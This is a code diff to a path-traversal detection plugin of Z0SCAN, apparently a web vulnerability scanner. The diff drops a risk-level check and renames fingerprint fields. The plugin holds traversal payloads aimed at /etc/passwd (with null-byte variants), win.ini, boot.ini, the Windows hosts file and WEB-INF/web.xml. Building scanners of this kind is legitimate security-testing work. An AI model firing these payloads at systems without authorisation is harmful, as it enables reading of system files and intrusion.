@@ -15,7 +15,7 @@ class Z0SCAN(PluginBase):
     risk = 2
 
     def condition(self, iterdatas):
-        if conf.level == 0 or not self.risk in conf.risk or self.fingerprints.waf:
+        if conf.level == 0 or self.fingerprints.waf:
             return False
         for _ in iterdatas:
             key, value, position = _
@@ -28,16 +28,16 @@ class Z0SCAN(PluginBase):
         default_extension = ".jpg"
         payloads.append("../../../../../../../../../../../etc/passwd%00")
         payloads.append("/etc/passwd")
-        if not "LINUX" in self.fingerprints.os or not "DARWIN" in self.fingerprints.os:
+        if not "LINUX" in self.fingerprints.finger or not "DARWIN" in self.fingerprints.finger:
             payloads.append("../../../../../../../../../../etc/passwd{}".format(unquote("%00")))
             payloads.append("../../../../../../../../../../etc/passwd{}".format(unquote("%00")) + default_extension)
-        if not "WINDOWS" in self.fingerprints.os is False:
+        if not "WINDOWS" in self.fingerprints.finger is False:
             payloads.append("../../../../../../../../../../windows/win.ini")
             payloads.append("C:\\boot.ini")
             # if origin:
             #     payloads.append(dirname + "/../../../../../../../../../../windows/win.ini")
             payloads.append("C:\\WINDOWS\\system32\\drivers\\etc\\hosts")
-        if not "JAVA" in self.fingerprints.programing:
+        if not "JAVA" in self.fingerprints.finger:
             payloads.append("/WEB-INF/web.xml")
             payloads.append("../../WEB-INF/web.xml")
         return payloads
